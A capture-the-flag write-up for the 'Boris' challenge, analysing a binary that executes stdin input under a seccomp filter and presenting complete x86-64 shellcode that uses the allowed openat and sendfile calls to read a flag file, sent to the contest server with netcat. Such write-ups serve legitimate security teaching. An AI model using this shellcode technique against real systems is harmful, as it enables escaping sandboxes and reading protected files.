## Source Analysis - Boris

### First things first

We are given an ELF x86-64 binary, let's execute it and see what happens.

```  
┌──(kali㉿kali)-[~/ctf/digitaloverdose]  
└─$ ./boris  
[.] Boris is bored. My genius needs using! Give me something to do!  
1234  
[+] Finally, a task! But you'll never break my access codes...  
[!] Access codes applied!

                                             'lxko,  
                                             ;xXWWO;  
                                               cKWWk,  
                           '''                 ':kNWk,  
        ',,,           ':dO0Kkc,'               'xWMWOc'  
      ;d0KK0l'        'oNMMMMWK0Oc'              dWMMMKc  
     'xWMMW0l'        ;0MMMMMMMWMKx:             dWMMMNo  
     ,OMM0o:'         ;0MMMMMMMMMNKo             dWMMMWd  
    :xXMWx,           ,kMMMMMMMMM0o;             dWMMMMO,  
   'OMMMWk,           'dWMMMMMMMMOc,            :0MMMMMNo  
    xMMMW0c'           ,dNMMMMMMM0d:''  ',,   ,l0WMMMMMWd  
    oNMMMXOl'        ':lxXMMMMMMMWNXKOxk0XKOk0XWMMMMMMMWd  
    ;0MMMNK0l    ',;;:oKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:  
     dWMMMMMXkddokKKkdkXMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXd,  
     :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xoc,  
     'ck0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXkdl;'  
        ';cloxKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMO,  
             'dWMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk,  
             ,OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk,  
             lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO;  
            'xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk,

             ---------  I'm INVINCIBLE!! ---------

[.] Good luck... you'll need it!  
[!] Better luck next time. SLUGHEADS!  
```

The program is waiting for input, then sleeping for a short moment and
printing the text seen above.

### Dynamic Analysis

By running an strace on the program, we can already get a good idea of what is
happening in the background. Interesting parts of the output can be seen
below:

```  
mmap(0xdead000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0xdead000  
read(0, 1234  
"1234\n", 4096)                 = 5  
write(1, "[+] Finally, a task! But you'll "..., 63[+] Finally, a task! But
you'll never break my access codes...  
) = 63  
seccomp(SECCOMP_SET_MODE_STRICT, 1, NULL) = -1 EINVAL (Invalid argument)  
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, NULL) = -1 EFAULT
(Bad address)  
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_LOG, NULL) = -1 EFAULT
(Bad address)  
seccomp(SECCOMP_GET_ACTION_AVAIL, 0, [SECCOMP_RET_LOG]) = 0  
seccomp(SECCOMP_GET_ACTION_AVAIL, 0, [SECCOMP_RET_KILL_PROCESS]) = 0  
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_SPEC_ALLOW, NULL) = -1
EFAULT (Bad address)  
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, NULL) = -1
EFAULT (Bad address)  
seccomp(SECCOMP_GET_NOTIF_SIZES, 0, 0x7ffd72c11ae2) = 0  
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC_ESRCH, NULL) = -1
EFAULT (Bad address)  
[...]  
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7fd468e5bc0a} ---  
write(1, "[!] Better luck next time. SLUGH"..., 38[!] Better luck next time.
SLUGHEADS!  
) = 38  
exit_group(-1)                          = ?  
+++ exited with 255 +++  
```

Aha! Right before we send our input, the program allocated 4096 bytes of
memory with RWX permission at the address 0xdead000. After running the strace
twice, we notice that the address doesn't change.

Next we notice a few calls to seccomp(), seccomp can be used to restrict the
usage of certain syscalls, more on this later.

At last the program receives a Segmentation Fault and exits. This means the
program tried to access invalid memory in one way or another. Since we didn't
get a segmentation fault message earlier, it can be assumed the program
implements a custom signal handler.

### Static Analysis

If we decompile the program with Ghidra and take a look at the main function,
we can already recognize a lot of things we found during dynamic analysis.

```c  
 do {  
    if (3 < local_1ac) {  
       puts("[.] Boris is bored. My genius needs using! Give me something to do!");  
       fflush(stdout);  
       map_rwx = mmap((void *)0xdead000,0x1000,7,0x22,0,0);  
       if ((int)map_rwx == 0xdead000) {  
          read(0,(void *)0xdead000,0x1000);  
          puts("[+] Finally, a task! But you\'ll never break my access codes...");  
          fflush(stdout);  
          bVar1 = sec();  
          if ((int)CONCAT71(extraout_var,bVar1) == 0) {  
             nanosleep(&local_198,&local_1a8);  
             puts("[!] Access codes applied!");  
             puts(BORIS_ART);  
             puts("[.] Good luck... you\'ll need it!");  
             fflush(stdout);  
             nanosleep(&local_198,&local_1a8);  
             (*(code *)0xdead000)();  
             uVar3 = 0;  
          }  
          else {  
             uVar3 = 1;  
          }  
       }  
```

Okay let's dig through this code a little more. We can ignore the two
conditions as we already know we can reach at least `puts("[.] Good luck...
you\'ll need it!");` in the code.

This part will allocate 4096 bytes in memory at a fixed address of 0xdead000
with RWX permissions. You can read more about mmap and it's flags
[here](https://man7.org/linux/man-pages/man2/mmap.2.html).

```c  
map_rwx = mmap((void *)0xdead000,0x1000,7,0x22,0,0);  
```

Then the program reads 4096 bytes from stdin to this previosuly mapped memory
area:

```c  
read(0,(void *)0xdead000,0x1000);  
```

Afterwards the program does a few sleep commands and finally executes this
line:

```c  
(*(code *)0xdead000)();  
```

Essentially what this does is treat the memory at 0xdead000 as
code/instructions and execute it like a regular function call. That also
explains the segmentation fault from earlier, the program tried to execute my
`"1234\n"` input, which probably resulted in bad instructions.

So this means we can simply read shellcode from stdin and get a shell, right?!
Sadly, no. If we try to read a regular shellcode performing an
execve("/bin/sh",0,0) for example, we notice that nothing happens.

### What is seccomp?

Excerpt from wikipedia:  
> **seccomp** (short for **secure computing mode**) is a computer security
> facility in the Linux kernel. seccomp allows a process to make a one-way
> transition into a "secure" state where it cannot make any system calls
> except `exit()`, `sigreturn()`, `read()` and `write()` to already-open file
> descriptors.

So basically seccomp can be used to restrict the usage of syscalls to only a
very few, which won't allow us to execute code.

During our initial analysis with strace, we already noticed a few calls to
`seccomp()`. Looking a little bit closer with Ghidra we find that the `sec()`
function is where these calls are being made.

```c  
bool sec(void)

{  
 int success;  
 undefined8 ctx;  
 uint counter;  
 undefined4 syscall_nums [8];

 ctx = seccomp_init(0x30000);  
 syscall_nums[0] = 257;  
 syscall_nums[1] = 0;  
 syscall_nums[2] = 1;  
 syscall_nums[3] = 40;  
 syscall_nums[4] = 60;  
 syscall_nums[5] = 231;  
 syscall_nums[6] = 80;  
 syscall_nums[7] = 230;  
 counter = 0;  
 while( true ) {  
    if (7 < counter) {  
       success = seccomp_load(ctx);  
       return success != 0;  
    }  
    success = seccomp_rule_add(ctx,0x7fff0000,syscall_nums[(int)counter],0);  
    if (success != 0) break;  
    counter = counter + 1;  
 }  
 return true;  
}  
```

The sec function first initializes a new context by calling
`seccomp_init(0x30000);`. The value `0x30000` refers to the
[SCMP_ACT_TRAP](https://github.com/seccomp/libseccomp/blob/main/include/seccomp.h.in#L351)
action. This means everytime a syscall not in the current filter is called, a
SIGTRAP will be triggered.

Next the function initializes an array with 8 values each corresponding with a
syscall. Again, you can look up each syscall in [this
table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

Then it's looping 8 times, calling
`seccomp_rule_add(ctx,0x7fff0000,syscall_nums[(int)counter],0)` each time.
Essentially it's adding all these 8 syscalls to the filter, so they will be
allowed and won't trigger a SIGTRAP.

### Writing the shellcode

Now that we know which syscalls are allowed, we can start to build our
shellcode. Since we have 4096 bytes to read, we don't have to worry about
space or any other constraints. The read() syscall can even read nullbytes, so
we don't have to avoid them (I did anyway, as practice).

The interesting syscalls that I used for my shellcode are:

|%rax|System Call|%rdi|%rsi|%rdx|%r10|  
|-|-|-|-|-|-|  
|40|sys_sendfile|int out_fd|int in_fd|off_t *offset|size_t count|  
|80|sys_chdir|const char *filename|  
|257|sys_openat|int dfd|const char *filename|int flags|int mode|

The challenge description already gave away that the flag is located at
`/flag.txt`, so my shellcode would look something like this in pseudo code:

```c  
sys_chdir("/");  
int fd = sys_openat(AT_FDCWD, "flag.txt", 0, 0);  
sys_sendfile(1, fd, 0, 30);  
```

I think the code is pretty self explanatory. Reading through the [man
page](https://linux.die.net/man/2/openat) for `openat()`, we learn that we
need to use `AT_FDCWD` as the directory file descriptor to use the current
working directory. The numeric value of `AT_FDCWD` is `-100` as seen
[here](https://github.com/spotify/linux/blob/master/include/linux/fcntl.h#L35).

My final shellcode written in assembly can be seen below:

```  
0:   48 31 c0                xor    rax,rax                  ; rax = 0  
3:   48 31 db                xor    rbx,rbx                  ; rbx = 0  
6:   b3 2f                   mov    bl,0x2f                  ; rbx = "/"  
8:   50                      push   rax  
9:   53                      push   rbx  
a:   48 89 e7                mov    rdi,rsp                  ; rdi = address
of "/"  
d:   48 83 c0 50             add    rax,0x50                 ; rax = 80  
11:   0f 05                   syscall                         ; sys_chdir("/")  
13:   48 31 c0                xor    rax,rax                  ; rax = 0  
16:   48 bb 66 6c 61 67 2e    movabs rbx,0x7478742e67616c66   ; rbx =
"flag.txt"  
1d:   74 78 74  
20:   50                      push   rax  
21:   53                      push   rbx  
22:   48 31 ff                xor    rdi,rdi ; rdi = 0  
25:   48 c7 c7 9c ff ff ff    mov    rdi,0xffffffffffffff9c   ; rdi = -100  
2c:   48 31 d2                xor    rdx,rdx  
2f:   48 89 e6                mov    rsi,rsp                  ; rsi = address
of "flag.txt"  
32:   48 c7 c0 ff fe ff ff    mov    rax,0xfffffffffffffeff   ; rax = -257
(avoid null byte)  
39:   48 f7 d8                neg    rax                      ; rax = -rax  
3c:   0f 05                   syscall                         ;
openat(-100,"flag.txt", 0, 0)  
3e:   50                      push   rax                      ; push fd to
stack  
3f:   48 31 c0                xor    rax,rax                  ; rax = 0  
42:   48 83 c0 28             add    rax,0x28                 ; rax = 40  
46:   48 31 ff                xor    rdi,rdi                  ; rdi = 0  
49:   48 ff c7                inc    rdi                      ; rdi = rdi + 1  
4c:   5e                      pop    rsi                      ; rsi = fd  
4d:   48 31 d2                xor    rdx,rdx                  ; rdx = 0
(offset)  
50:   4d 31 d2                xor    r10,r10                  ; r10 = 0
(count)  
53:   49 83 c2 1e             add    r10,0x1e                 ; r10 = 30
(count)  
57:   0f 05                   syscall                         ; sendfile(1,
fd, 0, 30)  
```

Finally we assemble the shellcode, save it to a file, then redirect it into
our netcat command to receive the flag!

```  
┌──(kali㉿kali)-[~/ctf/digitaloverdose]  
└─$ nc 193.57.159.27 40000 < shellcode.txt

[.] Boris is bored. My genius needs using! Give me something to do!  
[+] Finally, a task! But you'll never break my access codes...  
[!] Access codes applied!

                                             'lxko,  
                                             ;xXWWO;  
                                               cKWWk,  
                           '''                 ':kNWk,  
        ',,,           ':dO0Kkc,'               'xWMWOc'  
      ;d0KK0l'        'oNMMMMWK0Oc'              dWMMMKc  
     'xWMMW0l'        ;0MMMMMMMWMKx:             dWMMMNo  
     ,OMM0o:'         ;0MMMMMMMMMNKo             dWMMMWd  
    :xXMWx,           ,kMMMMMMMMM0o;             dWMMMMO,  
   'OMMMWk,           'dWMMMMMMMMOc,            :0MMMMMNo  
    xMMMW0c'           ,dNMMMMMMM0d:''  ',,   ,l0WMMMMMWd  
    oNMMMXOl'        ':lxXMMMMMMMWNXKOxk0XKOk0XWMMMMMMMWd  
    ;0MMMNK0l    ',;;:oKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:  
     dWMMMMMXkddokKKkdkXMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXd,  
     :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xoc,  
     'ck0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXkdl;'  
        ';cloxKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMO,  
             'dWMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk,  
             ,OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk,  
             lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO;  
            'xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk,

             ---------  I'm INVINCIBLE!! ---------

[.] Good luck... you'll need it!  
DO{H0w_cAn_thi5_b3!?_n0b0dy_Sp!ke5_B0r1s!}  
[!] Better luck next time. SLUGHEADS!  
```

Original writeup (https://lo0l.com/2021/10/11/digitaloverdose.html#source-
analysis---boris).